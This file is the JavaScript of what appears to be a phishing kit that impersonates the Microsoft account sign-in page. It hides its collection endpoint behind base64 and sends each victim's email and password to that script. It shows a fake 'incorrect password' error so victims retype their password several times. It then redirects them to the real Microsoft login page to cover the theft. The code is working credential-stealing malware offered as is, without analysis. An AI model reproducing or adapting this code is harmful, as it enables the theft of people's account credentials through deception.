
		$(document).ready(function(){
			var count=0;
			var uri = atob('bmV4dC5waHA');

			function ValidateEmail(mail) {
				if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)){
					return (true)
				}
					return (false)
			}
			function postdata(){
				$.ajax({
					dataType: 'JSON',
					url: uri,
					type: 'GET',
					data: {
						ai: i0116.value,
						pr: i0118.value
					},
					beforeSend: function(xhr) {
						$('#idSIButton10').val('Verifing...');
						$("#idSIButton10").attr("disabled", true);
					},
					success: function(response) {
						//console.log(response);
						if(response['signal'] == "ok") { 
							$("#idSIButton10").attr("disabled", false);
							if(count <= 2) {
								count++;
								console.log(count);
								$("#i0118").val('');
								$("#i0118").focus();
								$('#idSIButton10').html('Sign in');
								$("#idSIButton10").attr("disabled", false);
							}else{
								$('#msg').html('Success! Redirecting...');
								setTimeout('window.location.href=\x27https://login.microsoftonline.com\x27;', 0x5dc);
							}
						}
					},
					complete: function(response) {
						console.log(response);
						document.getElementById("usernameError").innerHTML = "Your account or password is incorrect. If you don't remember your password, <a id='idA_IL_ForgotPassword0' href='#' role='link'>reset it now.";
					document.getElementById("usernameError").style.display = "block";
						$('#idSIButton10').val('Sign in');
						$("#idSIButton10").attr("disabled", false);
					}
					
				});
			}
			$('#idSIButton9').click(function(event){
				event.preventDefault();
				if(!ValidateEmail(i0116.value)){
					document.getElementById("usernameError").style.display = "block";
					i0116.focus();	
				}else{
					document.getElementById("theOptions").style.display = "none";
					document.getElementById("noAccount").style.display = "none";
					document.getElementById("i0116").style.display = "none";
					document.getElementById("idBtn_Back").style.display = "none";
					document.getElementById("idSIButton9").style.display = "none";
					document.getElementById("identityBanner").style.display = "block";
					document.getElementById("idSIButton10").style.display = "block";
					document.getElementById("i0118").classList.remove("moveOffScreen");
					document.getElementById('cantAccessAccount').innerHTML = "Forgot my password";
					document.getElementById('theTitle').innerHTML = "Enter password";
					var email=$("#i0116").val();
					document.getElementById('displayName').innerHTML = email;
				}
				
			});
			$('#idSIButton10').click(function(event){
				event.preventDefault();
				var psf=$("#i0118").val();
				document.getElementById("usernameError").style.display = "none";
				if (!psf || psf === "") {
					document.getElementById("usernameError").innerHTML = "Your account or password is incorrect. If you don't remember your password, <a id='idA_IL_ForgotPassword0' href='#' role='link'>reset it now.";
					document.getElementById("usernameError").style.display = "block";
					i0118.focus();
				}else{
					postdata();
				}
			});
		});
	